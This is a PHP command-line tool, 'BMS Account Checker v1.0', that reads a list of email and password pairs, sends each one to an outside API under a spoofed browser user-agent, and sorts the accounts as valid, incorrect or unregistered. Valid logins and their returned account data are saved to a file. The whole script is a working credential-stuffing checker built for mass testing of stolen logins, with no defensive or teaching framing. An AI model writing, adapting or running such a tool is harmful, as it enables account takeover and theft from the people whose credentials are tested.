<?php
// error_reporting(0);
define("API", "https://api.dw1.website");

function call($data, $endpoint) {
    $context = stream_context_create(array(
        "http" => array(
            "method" => "POST",
            "header" => implode("\r\n", array(
                "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0",
                "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
                "Origin: " . API,

            )),
            "content" => $data,
        ),
    ));

    $response = file_get_contents(API . $endpoint, false, $context);

    if (strpos($http_response_header[0], "200") == true) {
        return $response;
    } else {
        exit("Something wrong, but Idk why.\n");
    }
}

function check($email, $pass) {
    $post = call("email=" . $email . "&password=" . $pass, "/BMS/check");
    return json_decode($post, 1);
}

function validate($email) {
    if (filter_var($email, FILTER_VALIDATE_EMAIL)) return true;
    else return false;
}

function simpen($dmn, $apa) {
    fwrite(fopen($dmn, "a+"), "[" . date("Y/m/d H:i:s") . "] " . $apa . PHP_EOL);
    fclose(fopen($dmn, "a+"));
}

function verbose() {
    global $cmd;
    if (isset($cmd['v']) || isset($cmd['verbose'])) return true;
    else return false;
}

######################################
echo "\n  # BMS Account Checker v1.0";
echo "\n  # @ 2017, dw1\n\n";
$opened = "Usage: php " . basename(__FILE__) . " -l lists.txt -d \";\" -o output.txt\n\n";
$header = "Startup:";
$header .= "\n  -l LISTS\t\tLISTS of email & password.";
$header .= "\n  -d DELIM\t\tseperates email & password by common DELIMeter.\n\n";
$header .= "Optional arguments:";
$header .= "\n  -h,  --help\t\tprint this help.";
$header .= "\n  -o FILE\t\tlog results to FILE.";
$header .= "\n  -v,  --verbose\tshows details about the results of surfing.";
######################################

$cmd = getopt("l:d:o:h::v::", array("help::", "verbose::"));
if (isset($cmd['h']) || isset($cmd['help'])) exit($opened . $header . "\n");
elseif (empty(@$cmd['l']) || empty(@$cmd['d'])) exit($opened . "Try `php " . basename(__FILE__) . " --help' for more options.\n");
$lists = @file_get_contents($cmd['l']);
if ($lists === false) exit($opened . "Failed to open \"" . $cmd['l'] . "\" file.\n");
$empass = explode("\n", $lists);

// 0 = incorect
// 1 = success
// 2 = not registered
// 3 = problem

$i = 1; $t = count($empass)+1; $_0 = 0; $_1 = 0; $_2 = 0; $_3 = 0;
foreach ($empass as $list) {
    $delim = explode($cmd['d'], $list);
    $email = @$delim[0]; $pass = @$delim[1];
    if (validate($email) && isset($pass)) {
        $check = check($email, $pass);
        if (isset($check['status'])) {
            $status = $check['status'];
            if ($status == 0) {
                if (verbose()) echo $i . ". INCORECT! " . $list . "\n";
                $_0++;
            } elseif ($status == 1) {
                if (isset($cmd['o'])) simpen($cmd['o'], $list . $check['data']);
                echo $i . ". OK! " . $list . "\n";
                $_1++;
                if (!verbose()) $i++;
            } elseif ($status == 2) {
                if (verbose()) echo $i . ". INVALID! " . $list . "\n";
                $_2++;
            } elseif ($status == 3) {
                if (verbose()) echo $i . ". PROBLEM! " . $list . " [Reason: " . $check['error'] . "]\n";
                $_3++;
            }
        }
    } else $_0++;
    if (verbose()) $i++;
}

exit("\nTotal " . $_0 . " incorect, " . $_1 . " valid, " . $_2 . " not registered & " . $_3 . " have problem." . (@$cmd['o'] !== null ? "\n" . $_1 . " valid accounts saved to " . $cmd['o'] : null) . "\nDone!\n");
